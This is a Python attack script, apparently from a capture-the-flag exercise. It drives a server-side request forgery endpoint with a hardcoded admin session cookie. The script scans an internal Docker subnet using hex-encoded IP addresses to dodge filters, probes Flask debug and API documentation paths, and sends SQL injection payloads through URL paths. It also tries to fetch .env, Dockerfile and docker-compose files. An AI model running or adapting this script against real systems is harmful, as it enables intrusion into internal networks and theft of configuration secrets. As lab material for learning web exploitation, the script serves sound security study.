#!/usr/bin/env python3
"""Deeper internal-api exploration via SSRF."""
import requests
import re
import html as html_mod

SESSION = "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.amiz9w.0WjzyknMhK0dclFCs8-dT-9hk6I"

def probe(target_url, timeout=10):
    """Send SSRF probe request and return parsed result."""
    try:
        resp = requests.post(
            "http://10.0.174.208:80/probe",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": SESSION,
            },
            data={
                "target_url": target_url,
                "timeout": str(timeout),
                "follow_redirect": "off",
            },
            timeout=timeout + 15,
        )
        text = resp.text
        
        status_match = re.search(r'状态码.*?header-item">(\d+)', text)
        content_len_match = re.search(r'内容长度.*?header-item">([^<]+)', text)
        content_type_match = re.search(r'Content-Type.*?header-item">([^<]+)', text)
        body_match = re.search(r'<pre[^>]*>(.*?)</pre>', text, re.DOTALL)
        error_match = re.search(r'alert-danger[^>]*>(.*?)</div>', text, re.DOTALL)
        
        status = status_match.group(1) if status_match else None
        clen = content_len_match.group(1) if content_len_match else None
        ctype = content_type_match.group(1) if content_type_match else None
        body = ""
        if body_match:
            body = html_mod.unescape(body_match.group(1)).strip()
        error = None
        if error_match:
            error = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
        
        return {"status": status, "len": clen, "type": ctype, "body": body, "error": error}
    except Exception as e:
        return {"error": str(e)}

# Scan 172.18.0.0/24 for port 5000 with detailed response analysis
print("=" * 60)
print("Docker network scan for HTTP services on port 5000")
print("=" * 60)

# First, let's verify the known services
baseline_bodies = {}

for host in range(1, 15):
    ip_hex = f"0xAC.0x12.0x00.{host:02x}"
    url = f"http://{ip_hex}:5000/"
    result = probe(url, timeout=5)
    status = result.get("status")
    body = result.get("body", "")[:60]
    error = result.get("error", "")
    
    if status and status != "404":
        print(f"  172.18.0.{host}:5000 -> {status} | {body}")
    elif error and "Connection refused" not in error and "timeout" not in error.lower():
        print(f"  172.18.0.{host}:5000 -> ERROR: {error[:80]}")

# Now try to read internal-api source code differently
print()
print("=" * 60)
print("Try to access internal-api source via special Flask paths")
print("=" * 60)

# Flask sometimes exposes source through these paths
special_paths = [
    "/console",
    "/__debugger__",
    "/debugger",
    "/.well-known/",
    "/security.txt",
    "/admin/",
    "/api/",
    "/swagger.json",
    "/openapi.json",
    "/spec.json",
    "/docs",
    "/redoc",
]

for path in special_paths:
    url = f"http://0xAC.0x12.0x00.0x02:5000{path}"
    result = probe(url)
    status = result.get("status", "?")
    body = result.get("body", "")[:80]
    if status and status != "404":
        print(f"  {path}: {status} | {body}")

# Try to trigger different response codes
print()
print("=" * 60)
print("Response code differentiation on internal-api")
print("=" * 60)

test_urls = [
    "http://0xAC.0x12.0x00.0x02:5000/debug/config",  # 200
    "http://0xAC.0x12.0x00.0x02:5000/debug/",  # maybe 404
    "http://0xAC.0x12.0x00.0x02:5000/debug/config/",  # trailing slash
    "http://0xAC.0x12.0x00.0x02:5000/debug/config.json",
    "http://0xAC.0x12.0x00.0x02:5000/debug/config.xml",
    "http://0xAC.0x12.0x00.0x02:5000/debug/config.html",
]

for url in test_urls:
    result = probe(url)
    print(f"  {url}: {result.get('status', '?')} | {result.get('len', '-')}B | {result.get('body', '')[:60]}")

# CRITICAL: Try with different URL components that might trigger SQL
print()
print("=" * 60)
print("Try to find SQL injection via URL path as SQL parameter")
print("=" * 60)

# What if the path itself is used as a parameter to a SQL query?
# Like: SELECT * FROM services WHERE path = '<path>'
sql_path_tests = [
    "/debug/config' OR '1'='1",
    "/debug/config' UNION SELECT 1,2,3--",
    "/debug/config' AND 1=1--",
    "/debug/config' AND SLEEP(2)--",
    "/debug/config%27%20OR%20%271%27=%271",
    "/health' OR '1'='1",
    "/status' OR '1'='1",
]

for path in sql_path_tests:
    url = f"http://0xAC.0x12.0x00.0x02:5000{path}"
    result = probe(url)
    body = result.get("body", "")[:80]
    status = result.get("status", "?")
    clen = result.get("len", "-")
    if status != "404":
        print(f"  {path[:60]}: {status} | {clen}B | {body}")
    else:
        # Check if any 404 is different from standard
        if "Not Found" not in body:
            print(f"  {path[:60]}: {status} | DIFFERENT 404: {body[:60]}")

# What about the database name in URL?
print()
print("=" * 60)
print("Try database-related URL paths")
print("=" * 60)

db_paths = [
    "/debug/config/internal_db",
    "/debug/config?db=internal_db",
    "/internal_db",
    "/internal_db/flag",
    "/internal_db/flags",
    "/database/internal_db",
    "/db/internal_db/flag",
    "/mysql/internal_db/flag",
]

for path in db_paths:
    url = f"http://0xAC.0x12.0x00.0x02:5000{path}"
    result = probe(url)
    status = result.get("status", "?")
    if status and status != "404":
        print(f"  {path}: {status} | {result.get('body', '')[:80]}")

# Try to access via the internal URL from /debug/config
print()
print("=" * 60)
print("Try alternative URL formats for internal-api")
print("=" * 60)

# The config reveals internal_url: http://internal-api:5000
# What if there's a way to use this?
alt_urls = [
    "http://0xAC.0x12.0x00.0x02:5000/.env",
    "http://0xAC.0x12.0x00.0x02:5000/Procfile",
    "http://0xAC.0x12.0x00.0x02:5000/Dockerfile",
    "http://0xAC.0x12.0x00.0x02:5000/docker-compose.yml",
]

for url in alt_urls:
    result = probe(url)
    status = result.get("status", "?")
    if status and status != "404":
        print(f"  {url}: {status} | {result.get('body', '')[:80]}")
    else:
        print(f"  {url}: {status}")
